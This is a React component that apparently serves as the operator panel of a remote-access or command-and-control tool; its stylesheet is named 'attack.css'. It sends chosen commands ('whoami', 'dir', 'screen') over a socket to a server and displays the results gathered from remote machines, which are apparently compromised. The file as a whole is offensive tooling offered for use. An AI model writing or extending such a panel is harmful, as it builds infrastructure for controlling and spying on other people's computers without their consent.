import React, { useEffect, useState } from 'react'
import {io} from "socket.io-client"
import "./attack.css"
import axios from 'axios'

const COMMAND = () => {
    const [command , setCommand ] = useState("whoami")
    const [all_data , setAllData] = useState([] ?? [])
    
    const handle_command = async() => {
        try {
            const socket = await io.connect(process.env.REACT_APP_SOCKET_URL_LOCAL)
            await socket.emit("command",  command)
            setTimeout(() => {
                handle_getdata()
            }, 500);
        } catch (error) {
            console.log(error)
        }
    }

    const handle_getdata = async() => {
        try {
            axios({
                url : process.env.REACT_APP_SOCKET_URL_LOCAL + "command/data",
                method : "GET"
            })
            .then(res => {
                setAllData(res.data.data)
            })
            .catch(err => {
                return 0
            })
        } catch (error) {
            return 0
        }
    }
  return (
    <div
    className='header_attack'
    >
      <div className='command_header'>
        <select className='list_select' value={command} onChange={(e) => {
                    setCommand(e.target.value)
                }}>
                    <option value={"whoami"}>
                        whoami
                    </option>
                    <option value={"dir"}>
                        dir
                    </option>
                    <option value={"screen"}>
                        screen
                    </option>
                </select>
        <input className='submit-command' type='submit' onClick={handle_command} />
      </div>
      <div className='data_result_command'>
        {all_data?.map((el , index) => {
            if (el.whoami) {
                 return <h1 class='data_recv_elf'>
                     <div className='nummer'><p>{index}</p></div>
                     <div className='data_true'>{el?.whoami}</div>
                 </h1>
            }else if (el.dir) {
                 return <h1 class='data_recv_elf'>
                     <div className='nummer'>{index}</div>
                     <div className='data_true'>{el?.dir}</div>
                 </h1>
            }else {
                return <h1 class='data_recv_elf'>successfully</h1>
            }
        })}
      </div>
    </div>
  )
}

export default COMMAND